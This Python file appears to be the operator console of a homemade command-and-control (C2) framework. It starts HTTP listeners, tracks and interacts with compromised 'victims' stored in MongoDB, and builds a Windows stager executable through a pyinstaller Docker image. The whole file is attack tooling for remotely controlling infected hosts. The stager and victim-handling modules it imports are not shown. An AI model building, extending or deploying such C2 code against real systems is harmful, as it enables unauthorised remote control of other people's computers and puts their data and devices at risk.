from lib.listener import Listener
from lib.database import Database
from lib.task import Task
from lib.victim import Victim
import pdb
import pymongo
import re
import os
import shutil
import subprocess
import argparse

def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	
	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
	args = parser.parse_args()
	return args


def display_main_help_menu():
	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}

	for command in commands.keys():
		print(command + " ---> " + commands[command])

def generate_stager():
	## Convert to exe and save
	if os.path.exists('./tmp'):
		shutil.rmtree('./tmp')

	os.mkdir('./tmp')
	subprocess.call('cp stager.spec tmp',shell=True)
	subprocess.call('cp requirements.txt tmp',shell=True)
	subprocess.call('cp stager.py tmp',shell=True)
	subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)


def main(db_object):
	args = parser()
	myclient = db_object.mongoclient

	if args.generate:
		## Import stager code and convert to exe
		generate_stager()

	while True:
		print("Enter command:")
		cmd = str(input())

		if cmd == 'http':
			h = Listener(port="8080")
			
			h.start_listener()
			print("Started http listener.")

		elif cmd == 'listeners':
			Listener.show_listeners()

		elif cmd == 'kill_listeners':
			Listener.kill_all_listeners()


		elif cmd == 'generate':
			generate_stager()
			print("exe dumped to ./tmp")

		elif cmd == 'victims':
			## Load victims from db everytime and instatiate objects. TODO - any effcient approach?
			Victim.load_victims_from_db()
			Victim.show_victims()

		## Matching use LKF0599NMU
		if re.match(r'^use [\w\d]{1,10}$',cmd):

			Victim.load_victims_from_db()
			victim_id = re.findall(r'^use ([\w\d]{1,10})$',cmd)[0]

			## Supporting Regex to quickly interact with part of ID.
			r = re.compile(victim_id+".*")
			matched = list(filter(r.match, Victim.victims.keys()))

			if len(matched) == 0 :
				print("No victims found with that ID")
			elif len(matched) == 1 :
				victim_id = matched[0]
				print(f"Interacting with {victim_id}")
				Victim.victims[victim_id].victim_menu()
			else:
				print("Multiple victims found, Please provide full or unique ID.")


		elif cmd == 'help':
			display_main_help_menu()

		elif cmd == 'exit':
			Listener.kill_all_listeners()
			db_object.drop_db()
			break

if __name__=="__main__":

	db_object = Database(url="mongodb://localhost:27017/")
	Listener.mongoclient = db_object.mongoclient
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient

	

	try:
		main(db_object)
	except KeyboardInterrupt:
		Listener.kill_all_listeners()
		db_object.drop_db()